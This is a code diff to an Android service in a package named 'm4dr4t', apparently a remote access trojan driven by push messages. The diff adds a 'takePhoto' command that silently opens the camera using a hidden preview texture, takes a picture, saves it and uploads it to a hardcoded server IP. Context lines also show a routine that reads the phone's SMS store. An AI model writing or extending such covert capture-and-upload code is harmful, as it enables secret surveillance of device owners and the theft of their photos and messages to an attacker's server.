@@ -3,11 +3,14 @@ package example.com.m4dr4t;
 import android.app.IntentService;
 import android.app.NotificationManager;
 import android.content.ContentResolver;
+import android.content.ContentValues;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
+import android.graphics.ImageFormat;
+import android.graphics.SurfaceTexture;
 import android.hardware.Camera;
 import android.location.Location;
 import android.media.AudioManager;
@@ -15,14 +18,21 @@ import android.media.MediaPlayer;
 import android.net.Uri;
 import android.os.AsyncTask;
 import android.os.Bundle;
+import android.os.CountDownTimer;
 import android.os.Environment;
+import android.os.Handler;
+import android.os.Looper;
 import android.os.SystemClock;
 import android.os.Vibrator;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
+import android.provider.MediaStore;
 import android.support.v4.app.NotificationCompat;
 import android.telephony.SmsManager;
 import android.util.Log;
+import android.view.SurfaceHolder;
+import android.view.SurfaceView;
+import android.widget.Toast;
 
 import com.google.android.gms.common.ConnectionResult;
 import com.google.android.gms.common.GooglePlayServicesClient;
@@ -49,11 +59,14 @@ import java.io.File;
 import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
+import java.io.OutputStream;
 import java.io.OutputStreamWriter;
+import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Calendar;
 import java.util.Date;
 import java.util.List;
+import java.util.Locale;
 
 
 public class GcmIntentService extends IntentService implements
@@ -70,6 +83,7 @@ public class GcmIntentService extends IntentService implements
     Location mCurrentLocation;
     String lat, lng;
     private NotificationManager mNotificationManager;
+    protected static final int MEDIA_TYPE_IMAGE = 0;
 
 
     public GcmIntentService() {
@@ -153,8 +167,19 @@ public class GcmIntentService extends IntentService implements
                     alarm(message);
                 }
                 if (type.equalsIgnoreCase("takePhoto")) {
-                    String filepath = "/mnt/sdcard/pa_gapps.log";
-                    uploadFile(filepath);
+//                    String filepath = "/mnt/sdcard/pa_gapps.log";
+//                    uploadFile(filepath);
+                    Handler handler = new Handler(Looper.getMainLooper());
+
+                    handler.postDelayed(new Runnable() {
+                        @Override
+                        public void run() {
+                            // Run your task here
+                            takePhoto();
+
+                        }
+                    }, 1000);
+
 
                 }
                 else
@@ -230,6 +255,109 @@ public class GcmIntentService extends IntentService implements
 
 
     }
+    private void takePhoto() {
+
+
+
+
+         final Camera mCamera ;
+
+        Camera.Parameters parameters;
+
+        if(false)
+        {
+            int cameraId = findFrontFacingCamera();
+            mCamera = Camera.open(cameraId);
+        }
+        else
+        {
+            mCamera = Camera.open();
+        }
+
+        if(mCamera != null) {
+
+            try {
+                mCamera.setPreviewTexture(new SurfaceTexture(0));
+
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+            parameters = mCamera.getParameters();
+            parameters.setPictureFormat(ImageFormat.JPEG);
+            parameters.setJpegQuality(100);
+            parameters.setPictureSize(800, 600);
+            parameters.setFocusMode(Camera.Parameters.FOCUS_MODE_AUTO);
+            parameters.setSceneMode(Camera.Parameters.SCENE_MODE_AUTO);
+            parameters.setWhiteBalance(Camera.Parameters.WHITE_BALANCE_AUTO);
+            parameters.set("rotation", 270);
+
+
+            mCamera.setParameters(parameters);
+            mCamera.startPreview();
+            //mCamera.takePicture(null, null, mCall);
+            new CountDownTimer(2000, 1000) {
+                public void onFinish() {
+                    // When timer is finished
+                    // Execute your code here
+                    mCamera.takePicture(null, null, mCall);
+                }
+
+                public void onTick(long millisUntilFinished) {
+                    // millisUntilFinished    The amount of time until finished.
+                }
+            }.start();
+        }
+
+    }
+    private int findFrontFacingCamera() {
+        int cameraId = -1;
+        // Search for the front facing camera
+        int numberOfCameras = Camera.getNumberOfCameras();
+        for (int i = 0; i < numberOfCameras; i++) {
+            Camera.CameraInfo info = new Camera.CameraInfo();
+            Camera.getCameraInfo(i, info);
+            if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
+                Log.d(TAG, "Camera found");
+                cameraId = i;
+                break;
+            }
+        }
+        return cameraId;
+    }
+    Camera.PictureCallback mCall = new Camera.PictureCallback()
+    {
+
+        public void onPictureTaken(byte[] data, Camera camera)
+        {
+            //decode the data obtained by the camera into a Bitmap
+
+            FileOutputStream outStream = null;
+            try{
+                File root = android.os.Environment.getExternalStorageDirectory();
+                File dir = new File (root.getAbsolutePath() + "/download");
+                dir.mkdirs();
+                File file = new File(dir, "image.jpg");
+                outStream = new FileOutputStream(file );
+                outStream.write(data);
+                outStream.close();
+                Log.i(TAG,"Photo Saved");
+                String filepath = file.getAbsolutePath();
+                uploadFile upload = new uploadFile();
+                upload.execute(filepath);
+            } catch (FileNotFoundException e){
+                e.printStackTrace();
+            } catch (IOException e){
+                e.printStackTrace();
+            }
+            camera.release();
+
+
+
+
+        }
+    };
+
+
     private void flashLight (String message)
     {
 
@@ -261,44 +389,7 @@ public class GcmIntentService extends IntentService implements
     }
 
 
-    @SuppressWarnings("deprecation")
-    private void uploadFile(String filepath) {
-        String responseString = null;
 
-        HttpClient httpclient = new DefaultHttpClient();
-        HttpPost httppost = new HttpPost("http://128.199.179.143/upload/index.php");
-
-        try {
-            MultipartEntity entity = new MultipartEntity();
-
-            File sourceFile = new File(filepath);
-
-            // Adding file data to http body
-            entity.addPart("image", new FileBody(sourceFile));
-
-
-            httppost.setEntity(entity);
-
-            // Making server call
-            HttpResponse response = httpclient.execute(httppost);
-            HttpEntity r_entity = response.getEntity();
-
-            int statusCode = response.getStatusLine().getStatusCode();
-            if (statusCode == 200) {
-                // Server response
-                responseString = EntityUtils.toString(r_entity);
-                Log.i(TAG, responseString);
-            } else {
-                responseString = "Error occurred! Http Status Code: "
-                        + statusCode;
-            }
-
-        } catch (ClientProtocolException e) {
-            responseString = e.toString();
-        } catch (IOException e) {
-            responseString = e.toString();
-        }
-    }
 
     private void vibrate(String message) {
         if (v == null) {
@@ -521,13 +612,7 @@ public class GcmIntentService extends IntentService implements
 
 
     }
-    public boolean isExternalStorageWritable() {
-        String state = Environment.getExternalStorageState();
-        if (Environment.MEDIA_MOUNTED.equals(state)) {
-            return true;
-        }
-        return false;
-    }
+
     public void getsms() throws JSONException {
         Uri uriSMSURI = Uri.parse("content://sms/");
         Cursor cur = getContentResolver().query(uriSMSURI, null, null, null, null);
@@ -684,6 +769,61 @@ public class GcmIntentService extends IntentService implements
                 // TODO Auto-generated catch block
             }
             return responseBody;
+
+        }
+
+        /*
+         * (non-Javadoc)
+         *
+         * @see android.os.AsyncTask#onPostExecute(java.lang.Object)
+         */
+        @Override
+        protected void onPostExecute(String result) {
+
+
+        }
+
+    }
+    private class uploadFile extends AsyncTask<String, String, String> {
+
+        @Override
+        protected String doInBackground(String... params) {
+            String responseString = null;
+
+            HttpClient httpclient = new DefaultHttpClient();
+            HttpPost httppost = new HttpPost("http://128.199.179.143/upload/index.php");
+
+            try {
+                MultipartEntity entity = new MultipartEntity();
+
+                File sourceFile = new File(params[0]);
+
+                // Adding file data to http body
+                entity.addPart("image", new FileBody(sourceFile));
+
+
+                httppost.setEntity(entity);
+
+                // Making server call
+                HttpResponse response = httpclient.execute(httppost);
+                HttpEntity r_entity = response.getEntity();
+
+                int statusCode = response.getStatusLine().getStatusCode();
+                if (statusCode == 200) {
+                    // Server response
+                    responseString = EntityUtils.toString(r_entity);
+                    Log.i(TAG, responseString);
+                } else {
+                    responseString = "Error occurred! Http Status Code: "
+                            + statusCode;
+                }
+
+            } catch (ClientProtocolException e) {
+                responseString = e.toString();
+            } catch (IOException e) {
+                responseString = e.toString();
+            }
+            return responseString;
 
         }
 
